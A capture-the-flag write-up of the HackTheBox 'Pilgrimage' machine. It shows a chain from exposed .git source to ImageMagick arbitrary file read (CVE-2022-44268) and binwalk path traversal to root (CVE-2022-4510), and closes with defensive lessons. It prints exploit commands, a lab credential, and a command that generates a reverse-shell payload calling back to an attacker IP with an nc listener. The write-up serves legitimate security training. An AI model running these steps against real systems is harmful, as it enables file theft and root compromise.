---
title: "Pilgrimage"
date: 2023-06-24
type: docs
tags:
  - htb
  - linux
  - easy
  - git-disclosure
  - imagemagick
  - cve-2022-44268
  - arbitrary-file-read
  - binwalk
  - cve-2022-4510
  - inotify
  - sqlite
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Debian 11), **Difficulty:** Easy, **Released:** 2023-06-24, **IP:** `10.10.11.219` , `pilgrimage.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Exposed **`.git`** on the web root. Dump it and read the source for the "image shrinking" service.
2. The service resizes uploads with a **bundled ImageMagick 7.1.0-49 beta**, vulnerable to **CVE-2022-44268**. A crafted PNG makes the resizer embed the contents of an arbitrary file, hex encoded, into the output image's metadata. Read `/etc/passwd`, then the SQLite DB at `/var/db/pilgrimage`, and recover **`emily`**'s password. SSH in.
3. Root runs `malwarescan.sh`, which watches `/var/www/pilgrimage/shrunk/` with `inotifywait` and runs **binwalk 2.3.2** on every new file. binwalk 2.3.2 is vulnerable to **CVE-2022-4510**, a path traversal in the PFS extractor that yields code execution. Upload a malicious file, get a shell as root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| `emily` (from the SQLite `users` table) | `abigchonkyboi123` |
| `user.txt` | `/home/emily/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

When I first started poking at Pilgrimage, I didn't expect both the foothold and the privilege escalation to come from the same source: a `.git` directory the developer forgot to strip out of the production web root. That one oversight handed me the entire attack path before I'd even touched the application's real logic myself. Once I had the repository dumped locally, I could read the exact code running behind the "image shrinking" service, and more importantly, I could see which third-party binaries were bundled alongside it.

The first thing that caught my eye was a static `magick` binary checked directly into the repo. That's an unusual thing to commit, and it told me the developers had pinned a specific ImageMagick build rather than relying on whatever the system's package manager provided. My instinct was to check that version against known CVEs immediately, since a hand-bundled binary is almost always a sign it hasn't been touched since the day someone downloaded it. That instinct paid off: it turned out to be a beta build of ImageMagick 7.1.0-49, vulnerable to CVE-2022-44268. What makes this bug elegant is that it isn't remote code execution at all, it's an arbitrary file read that gets handed back to me embedded inside the very image I uploaded. I only needed to convince the resizer to leak one file for me: the SQLite database backing the application's user table.

The second CVE came out of the same source-diving exercise. Buried in the repo was `malwarescan.sh`, a script root was running to "protect" the server by scanning every new upload with binwalk. Seeing a security tool running as root against attacker-controlled input told me immediately where the privilege escalation was going to live. I focused there rather than hunting for SUID binaries or stray cron jobs, because the intent of the script was already staring at me in plain text.

This box pairs nicely with a couple of patterns I've run into elsewhere. For more `.git` disclosure and source review, see [Cat](/writeups/hackthebox/linux/medium/cat/) and [Dog](/writeups/hackthebox/linux/easy/dog/). For a different flavor of ImageMagick abuse, [Titanic](/writeups/hackthebox/linux/easy/titanic/) exploits a separate CVE in the same library. And for the broader "root watches a directory and blindly runs a tool against new files" privesc pattern, both [Titanic](/writeups/hackthebox/linux/easy/titanic/) and [Inject](/writeups/hackthebox/linux/easy/inject/) are worth comparing against what I found here.

---

## Full Walkthrough

### Reconnaissance

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1
80/tcp open  http    nginx 1.18.0
| http-git:
|   10.10.11.219:80/.git/
|_    Last commit message: Pilgrimage image shrinking service initial commit.
|_http-title: Pilgrimage - Shrink Your Images
```

I kicked things off with a standard nmap scan, and the `http-git` NSE script immediately flagged an exposed `/.git/` directory on the web root. That's always the first thing I look for on a box like this, since a leaked git history can hand over the entire application source before I've run a single fuzzer.

### Source disclosure

```bash
git-dumper http://pilgrimage.htb/ ./pilgrimage
```

With the repo exposed, I pulled the whole thing down with git-dumper rather than reconstructing objects by hand, since it automates walking the `.git` tree and is more than fast enough for a box this size.

Looking through what I'd dumped, I noticed the developers had committed a static **`magick`** binary directly into the source tree, which isn't something you'd normally expect to find in application code. That immediately made me suspicious that it was there for a reason, most likely because the system's own ImageMagick install didn't have the resize behavior they wanted, or because nobody ever revisited it after initial setup. Either way, my first move was to check exactly which version it was:

```console
$ ./magick --version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911
```

![Pasted image 20240224221351](Pasted-image-20240224221351.png)

Reading through `index.php` confirmed how the upload flow worked end to end: every file gets piped through `magick <upload> -resize 50% <output>`, the resized copy lands in `shrunk/` under a randomly generated filename, and a corresponding row gets written into a SQLite database. That resize command was exactly the injection point I needed for the ImageMagick bug, since it meant I controlled the input file that ImageMagick's PNG encoder would process.

<div class="callout callout-note">

**CVE-2022-44268, ImageMagick arbitrary file read**

Here's how I understand this vulnerability mechanically: when ImageMagick processes a PNG containing a `tEXt` chunk whose keyword is `profile` and whose value is a filename, such as `/etc/passwd`, the encoder responsible for writing the *output* image opens that file on disk and embeds its raw contents, hex encoded, inside a `Raw profile type` block in the new image's metadata. In practice, that means I can upload a specially crafted PNG, let the server's own resize logic process it, download the shrunk result, and then pull the leaked data back out with `identify -verbose` or `exiftool`. There's no code execution involved, which is what makes the bug easy to underestimate at first glance: it's purely a file read primitive. But an arbitrary file read is more than enough when the file I want is a SQLite database sitting a few directories away.

</div>

### Foothold, read the database

With the vulnerability confirmed, I moved on to weaponizing it. I used a public proof-of-concept (voidz0r's implementation of CVE-2022-44268) to build a malicious PNG targeting `/var/db/pilgrimage`, the SQLite database I'd already spotted in the source. Once I uploaded it through the same resize endpoint and pulled back the shrunk output, extracting the embedded hex blob and decoding it gave me the raw database file.

```bash
# build the malicious PNG (public PoC, e.g. voidz0r/CVE-2022-44268)
cargo run "/var/db/pilgrimage"        # -> exploit.png
curl -F 'toConvert=@exploit.png' http://pilgrimage.htb/
# download the shrunk result, then:
identify -verbose shrunk_xxxx.png | grep -A2 'Raw profile type'
python3 -c "print(bytes.fromhex('...'.replace('\n','')))"
```

Opening the recovered database and querying the `users` table handed me a working credential pair right away: `emily` with the password `abigchonkyboi123`. Rather than dig further for a way to leverage that inside the web app itself, the obvious next move was to check whether the password had been reused for SSH, which on this box it had.

```bash
ssh emily@pilgrimage.htb        # abigchonkyboi123
```

### Privilege Escalation, binwalk CVE-2022-4510

Once I had a shell as `emily`, I turned to enumerating what root was doing on the box, since a foothold on an "easy" HTB machine is rarely the whole story. Running `pspy` to watch process activity without needing elevated privileges showed root periodically executing a script:

```bash
#!/bin/bash
# /usr/sbin/malwarescan.sh
inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read -r dir action file; do
  binwalk -e "/var/www/pilgrimage.htb/shrunk/$file" > /dev/null
  # ... deletes the file if binwalk finds anything "bad"
done
```

The script's use of binwalk against files I could write into `shrunk/` immediately caught my attention, so my next step was to check exactly which version was installed:

```console
emily@pilgrimage:~$ binwalk | head -1
Binwalk v2.3.2
```

<div class="callout callout-note">

**CVE-2022-4510, binwalk path traversal to RCE**

Digging into this CVE, I found that binwalk versions from 2.1.2b through 2.3.2 carry a directory traversal flaw in the **PFS filesystem extractor**. If a file's embedded PFS entries contain `../` path components, binwalk happily writes the extracted content outside its intended extraction directory whenever it runs with the `-e` flag, exactly the flag `malwarescan.sh` uses against every file I drop into the watched directory. The exploitation path I settled on was to craft a payload whose traversal writes a malicious `.plugin` file into `~/.config/binwalk/plugins/`. Binwalk auto-loads plugins from that directory on its next run, meaning the very next scan imports and executes my Python code as whatever user is running binwalk, which on this box is root. Rather than build the traversal payload from scratch, I used the Metasploit module `linux/local/binwalk_extract_dir_traversal` (public PoCs work just as well) to generate the malicious file for me.

</div>

With the mechanics understood, generating the payload and getting it into place was straightforward:

```bash
# generate the payload (public PoC) pointing a reverse shell at your box
python3 binwalk_exploit.py rev.png 10.10.14.5 9001
# drop it where inotifywait sees it
cp rev.png /var/www/pilgrimage.htb/shrunk/
```

I had a listener already waiting with `nc -lvnp 9001`, and within seconds of dropping the payload into `shrunk/`, `inotifywait` picked it up, binwalk processed it, and my planted plugin fired, landing me a shell as root.

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/emily/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Never serve `.git/` from a production web root.** This is the biggest lesson I took from this box: one leftover directory unraveled everything, the exact ImageMagick build and the privesc script both fell out of the source. The fix is trivial on the defensive side: block `.git` at the web server config level (an nginx `location ~ /\.git { deny all; }` block takes seconds to add), and better still, never deploy from a working copy that carries version control metadata into production in the first place. A CI/CD pipeline that ships build artifacts from a clean export sidesteps this entirely.
- **Don't bundle third-party binaries into your own repo and then forget about them.** The static `magick` build sat there unpatched because nobody had a process for tracking it. Pin dependencies through an actual package manager so security updates flow through normal channels instead of freezing silently in time.
- **Patch ImageMagick against CVE-2022-44268**, and go beyond patching by locking down `policy.xml` to disable coders and delegates you don't actually need. A resize service has no legitimate reason to process a `tEXt` profile chunk that points at an arbitrary filesystem path.
- **Security tooling is still software, and software has bugs.** The privesc here wasn't a misconfiguration in the usual sense, it was root trusting binwalk to safely process hostile input. Any time a defensive tool runs with elevated privileges against attacker-controlled files, that tool's own attack surface becomes part of your privilege boundary. I'd sandbox or drop privileges for that kind of scanning wherever it's practical to do so.
- **`inotifywait` piping into a privileged handler is a pattern I now watch for on every box.** Whatever code runs in response to a filesystem event needs to be as hardened as if it were facing the internet directly, because from an attacker's perspective, it effectively is.

---

## Related Writeups

- **`.git` disclosure and source review:** [Cat](/writeups/hackthebox/linux/medium/cat/), [Dog](/writeups/hackthebox/linux/easy/dog/)
- **ImageMagick abuse:** [Titanic](/writeups/hackthebox/linux/easy/titanic/)
- **Root processes a directory of attacker files:** [Titanic](/writeups/hackthebox/linux/easy/titanic/), [Inject](/writeups/hackthebox/linux/easy/inject/)
- **Read a SQLite DB to get creds:** [Cat](/writeups/hackthebox/linux/medium/cat/), [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/)

## References

- CVE-2022-44268 (ImageMagick) <https://www.metabaseq.com/imagemagick-zero-days/>
- CVE-2022-4510 (binwalk) <https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/>
- git-dumper <https://github.com/arthaud/git-dumper>
